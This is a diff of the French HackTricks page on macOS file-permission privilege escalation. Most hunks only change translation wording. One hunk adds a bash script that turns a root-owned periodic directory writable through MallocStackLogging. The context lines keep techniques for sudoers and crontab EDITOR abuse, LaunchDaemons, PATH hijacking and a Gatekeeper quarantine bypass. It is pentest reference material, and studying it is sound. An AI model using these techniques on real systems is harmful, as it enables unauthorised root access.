@@ -9,7 +9,7 @@ Autres façons de soutenir HackTricks :
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
 
 </details>
@@ -19,7 +19,7 @@ Autres façons de soutenir HackTricks :
 Permissions dans un **répertoire** :
 
 * **lecture** - vous pouvez **énumérer** les entrées du répertoire
-* **écriture** - vous pouvez **supprimer/écrire** des **fichiers** dans le répertoire et vous pouvez **supprimer des dossiers vides**.&#x20;
+* **écriture** - vous pouvez **supprimer/écrire** des **fichiers** dans le répertoire et vous pouvez **supprimer des dossiers vides**.
 * Mais vous **ne pouvez pas supprimer/modifier des dossiers non vides** à moins d'avoir des permissions d'écriture dessus.
 * Vous **ne pouvez pas modifier le nom d'un dossier** à moins d'en être le propriétaire.
 * **exécution** - vous êtes **autorisé à traverser** le répertoire - si vous n'avez pas ce droit, vous ne pouvez pas accéder à des fichiers à l'intérieur, ni à des sous-répertoires.
@@ -30,13 +30,13 @@ Permissions dans un **répertoire** :
 
 * Un **propriétaire de répertoire parent** dans le chemin est l'utilisateur
 * Un **propriétaire de répertoire parent** dans le chemin est un **groupe d'utilisateurs** avec **accès en écriture**
-* Un **groupe d'utilisateurs** a **accès en écriture** au **fichier**
+* Un **groupe d'utilisateurs** a un accès **en écriture** au **fichier**
 
 Avec l'une des combinaisons précédentes, un attaquant pourrait **injecter** un **lien symbole/dur** dans le chemin attendu pour obtenir une écriture arbitraire privilégiée.
 
 ### Cas spécial de la racine du dossier R+X
 
-S'il y a des fichiers dans un **répertoire** où **seul root a un accès en R+X**, ceux-ci ne sont **pas accessibles à d'autres personnes**. Ainsi, une vulnérabilité permettant de **déplacer un fichier lisible par un utilisateur**, qui ne peut pas être lu en raison de cette **restriction**, de ce dossier **vers un autre**, pourrait être exploitée pour lire ces fichiers.
+S'il y a des fichiers dans un **répertoire** où **seul root a un accès R+X**, ceux-ci ne sont **pas accessibles à d'autres personnes**. Ainsi, une vulnérabilité permettant de **déplacer un fichier lisible par un utilisateur**, qui ne peut pas être lu en raison de cette **restriction**, de ce dossier **vers un autre**, pourrait être exploitée pour lire ces fichiers.
 
 Exemple dans : [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)
 
@@ -44,11 +44,11 @@ Exemple dans : [https://theevilbit.github.io/posts/exploiting\_directory\_permis
 
 Si un processus privilégié écrit des données dans un **fichier** qui pourrait être **contrôlé** par un **utilisateur moins privilégié**, ou qui pourrait avoir été **précédemment créé** par un utilisateur moins privilégié. L'utilisateur pourrait simplement **le pointer vers un autre fichier** via un lien symbolique ou physique, et le processus privilégié écrira sur ce fichier.
 
-Consultez les autres sections où un attaquant pourrait **abuser d'une écriture arbitraire pour escalader les privilèges**.
+Vérifiez dans les autres sections où un attaquant pourrait **abuser d'une écriture arbitraire pour escalader les privilèges**.
 
 ## .fileloc
 
-Les fichiers avec l'extension **`.fileloc`** peuvent pointer vers d'autres applications ou binaires, de sorte que lorsque ils sont ouverts, l'application/le binaire sera celui/celle qui sera exécuté.\
+Les fichiers avec l'extension **`.fileloc`** peuvent pointer vers d'autres applications ou binaires, de sorte que lorsqu'ils sont ouverts, l'application/le binaire sera celui qui sera exécuté.\
 Exemple :
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -64,7 +64,7 @@ Exemple :
 ```
 ## FD arbitraire
 
-Si vous pouvez **faire en sorte qu'un processus ouvre un fichier ou un dossier avec des privilèges élevés**, vous pouvez abuser de **`crontab`** pour ouvrir un fichier dans `/etc/sudoers.d` avec **`EDITOR=exploit.py`**, ainsi `exploit.py` obtiendra le FD du fichier à l'intérieur de `/etc/sudoers` et l'exploitera.
+Si vous pouvez faire en sorte qu'un **processus ouvre un fichier ou un dossier avec des privilèges élevés**, vous pouvez abuser de **`crontab`** pour ouvrir un fichier dans `/etc/sudoers.d` avec **`EDITOR=exploit.py`**, ainsi `exploit.py` obtiendra le FD du fichier à l'intérieur de `/etc/sudoers` et l'exploitera.
 
 Par exemple : [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)
 
@@ -76,7 +76,7 @@ xattr -d com.apple.quarantine /path/to/file_or_app
 ```
 ### Drapeau uchg / uchange / uimmutable
 
-Si un fichier/dossier a cet attribut immuable, il ne sera pas possible d'y ajouter un xattr
+Si un fichier/dossier a cet attribut immuable, il ne sera pas possible d'y ajouter un xattr.
 ```bash
 echo asd > /tmp/asd
 chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
@@ -122,13 +122,13 @@ ls -le /tmp/test
 ```
 ### **com.apple.acl.text xattr + AppleDouble**
 
-Le format de fichier **AppleDouble** copie un fichier y compris ses ACEs.
+Le format de fichier **AppleDouble** copie un fichier incluant ses ACEs.
 
 Dans le [**code source**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html), il est possible de voir que la représentation textuelle de l'ACL stockée à l'intérieur du xattr appelé **`com.apple.acl.text`** va être définie comme ACL dans le fichier décompressé. Ainsi, si vous avez compressé une application dans un fichier zip avec le format de fichier **AppleDouble** avec un ACL qui empêche l'écriture d'autres xattrs... le xattr de quarantaine n'a pas été défini dans l'application :
 
 Consultez le [**rapport original**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) pour plus d'informations.
 
-Pour reproduire cela, nous devons d'abord obtenir la chaîne d'ACL correcte :
+Pour reproduire ceci, nous devons d'abord obtenir la chaîne d'ACL correcte :
 ```bash
 # Everything will be happening here
 mkdir /tmp/temp_xattrs
@@ -148,7 +148,7 @@ ls -le test
 ```
 (Notez que même si cela fonctionne, le bac à sable écrit l'attribut de quarantaine avant)
 
-Pas vraiment nécessaire mais je le laisse là au cas où:
+Pas vraiment nécessaire mais je le laisse là au cas où :
 
 {% content-ref url="macos-xattr-acls-extra-stuff.md" %}
 [macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
@@ -158,7 +158,7 @@ Pas vraiment nécessaire mais je le laisse là au cas où:
 
 Les bundles contiennent le fichier **`_CodeSignature/CodeResources`** qui contient le **hash** de chaque **fichier** dans le **bundle**. Notez que le hash de CodeResources est également **incorporé dans l'exécutable**, donc nous ne pouvons pas y toucher non plus.
 
-Cependant, il y a certains fichiers dont la signature ne sera pas vérifiée, ceux-ci ont la clé omit dans le plist, comme suit:
+Cependant, il y a certains fichiers dont la signature ne sera pas vérifiée, ceux-ci ont la clé omit dans le plist, comme suit :
 ```xml
 <dict>
 ...
@@ -210,7 +210,7 @@ openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/
 ```
 ## Monter des fichiers DMG
 
-Un utilisateur peut monter un fichier DMG personnalisé même sur certains dossiers existants. Voici comment vous pourriez créer un package DMG personnalisé avec un contenu personnalisé:
+Un utilisateur peut monter un fichier DMG personnalisé même par-dessus certains dossiers existants. Voici comment vous pourriez créer un package DMG personnalisé avec un contenu personnalisé :
 ```bash
 # Create the volume
 hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
@@ -237,13 +237,13 @@ hdiutil create -srcfolder justsome.app justsome.dmg
 
 ### Scripts sh périodiques
 
-Si votre script peut être interprété comme un **script shell**, vous pouvez écraser le script shell **`/etc/periodic/daily/999.local`** qui sera déclenché chaque jour.
+Si votre script peut être interprété comme un **script shell**, vous pourriez écraser le script shell **`/etc/periodic/daily/999.local`** qui sera déclenché chaque jour.
 
 Vous pouvez **simuler** l'exécution de ce script avec : **`sudo periodic daily`**
 
 ### Daemons
 
-Écrivez un **LaunchDaemon** arbitraire comme **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** avec un plist exécutant un script arbitraire comme :
+Écrivez un **LaunchDaemon** arbitraire tel que **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** avec un plist exécutant un script arbitraire comme suit :
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -262,14 +262,28 @@ Vous pouvez **simuler** l'exécution de ce script avec : **`sudo periodic daily`
 ```
 ### Fichier Sudoers
 
-Si vous avez **des droits d'écriture arbitraires**, vous pourriez créer un fichier à l'intérieur du dossier **`/etc/sudoers.d/`** vous accordant des privilèges **sudo**.
+Si vous avez **l'écriture arbitraire**, vous pourriez créer un fichier à l'intérieur du dossier **`/etc/sudoers.d/`** vous accordant des privilèges **sudo**.
 
 ### Fichiers PATH
 
-Le fichier **`/etc/paths`** est l'un des principaux endroits qui alimentent la variable d'environnement PATH. Vous devez être root pour le remplacer, mais si un script d'un **processus privilégié** exécute une **commande sans le chemin complet**, vous pourriez le **détourner** en modifiant ce fichier.
+Le fichier **`/etc/paths`** est l'un des principaux endroits qui alimentent la variable d'environnement PATH. Vous devez être root pour le remplacer, mais si un script d'un **processus privilégié** exécute une **commande sans le chemin complet**, vous pourriez être en mesure de le **détourner** en modifiant ce fichier.
 
-&#x20;Vous pouvez également écrire des fichiers dans **`/etc/paths.d`** pour charger de nouveaux dossiers dans la variable d'environnement `PATH`.
+Vous pouvez également écrire des fichiers dans **`/etc/paths.d`** pour charger de nouveaux dossiers dans la variable d'environnement `PATH`.
 
+## Générer des fichiers inscriptibles en tant qu'autres utilisateurs
+
+Cela générera un fichier appartenant à root qui est inscriptible par moi ([**code à partir d'ici**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). Cela pourrait également fonctionner comme une élévation de privilèges:
+```bash
+DIRNAME=/usr/local/etc/periodic/daily
+
+mkdir -p "$DIRNAME"
+chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"
+
+MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername
+
+FILENAME=$(ls "$DIRNAME")
+echo $FILENAME
+```
 ## Références
 
 * [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)
@@ -282,8 +296,8 @@ Autres façons de soutenir HackTricks:
 
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
 
 </details>
